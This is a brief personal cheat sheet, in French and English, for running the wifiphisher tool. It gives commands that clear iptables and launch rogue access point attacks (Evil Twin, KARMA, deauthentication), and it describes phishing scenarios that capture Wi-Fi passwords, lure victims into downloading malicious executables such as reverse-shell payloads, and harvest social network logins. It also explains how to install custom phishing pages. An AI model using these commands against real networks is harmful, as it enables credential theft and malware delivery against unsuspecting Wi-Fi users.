# wifiphisher


* [Wifiphisher](https://github.com/wifiphisher/wifiphisher)


Purger iptables avant lancement:

```sh
sudo iptables -X
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo wifiphisher 
```

## rogue AP avec 1 interface:

```sh
$ sudo wifiphisher -aI wlan0 -nE -p firmware-upgrade
```

## personnaliser l'attaque:

```sh
$ sudo wifiphisher -aI wlan0 -nE -p firmware-upgrade -pPD .
```

Run the tool by typing wifiphisher or python bin/wifiphisher (from inside the tool's directory).
By running the tool without any options, it will find the right  interfaces and interactively ask the user to pick the ESSID of the  target network (out of a list with all the ESSIDs in the around area) as  well as a phishing scenario to perform. By default, the tool will  perform both Evil Twin and KARMA attacks.

```sh
wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade --handshake-capture handshake.pcap
```

Use wlan0 for spawning the rogue Access Point and wlan4 for DoS  attacks. Select the target network manually from the list and perform  the "Firmware Upgrade" scenario. Verify that the captured Pre-Shared Key  is correct by checking it against the handshake in the handshake.pcap  file.
Useful for manually selecting the wireless adapters. The "Firmware Upgrade" scenario is an easy way for obtaining the PSK from a password-protected network.

```sh
wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd
```

Automatically pick the right interfaces. Target the Wi-Fi with ESSID  "CONFERENCE_WIFI" and perform the "Plugin Update" scenario. The Evil  Twin will be password-protected with PSK "s3cr3tp4ssw0rd".
Useful against networks with disclosed PSKs (e.g. in conferences). The "Plugin Update"  scenario provides an easy way for getting the victims to download  malicious executables (e.g. malwares containing a reverse shell  payload).

```sh
wifiphisher --essid "FREE WI-FI" -p oauth-login -kB
```

Simply spawn an open Wi-Fi network with ESSID "FREE WI-FI" and  perform the "OAuth Login" scenario. Furthermore, mount the "Known  Beacons" Wi-Fi automatic association technique.
Useful against victims in public areas. The "OAuth Login" scenario provides a simple way for capturing credentials from social networks, like Facebook.
Following are all the options along with their descriptions (also available with wifiphisher -h):

## création de page:

copier les pages sous: `/usr/lib/python2.7/dist-packages/wifiphisher/data/phishing-pages/`

copier un dossier: reprendre les page et le fichier `config.ini`

appeller par le nom (dans le config.ini) avec l'option `-p`


